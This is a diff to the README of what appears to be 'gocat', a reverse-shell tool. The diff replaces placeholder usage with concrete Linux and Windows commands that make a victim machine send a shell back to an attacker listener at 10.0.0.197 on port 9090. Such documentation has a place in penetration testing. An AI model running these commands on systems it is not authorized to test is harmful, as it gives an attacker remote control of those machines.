@@ -15,8 +15,11 @@ The command accepts 2 parameter:
 
         Attacker's IP address to send the shell back.
 
-### Linux Victim
-./gocat -s <attacker-IP> -p <attacker-port>
+### Examples
+If the attacker's IP address is 10.0.0.197 and the attacker started a listener on TCP port 9090 waiting for a connection back from the victim:
 
-### Windows victim
-gocat.exe -s <attacker-IP> -p <attacker-port>
+#### Linux Victim
+./gocat -s 10.0.0.197 -p 9090
+
+#### Windows victim
+gocat.exe -s 10.0.0.197 -p 9090
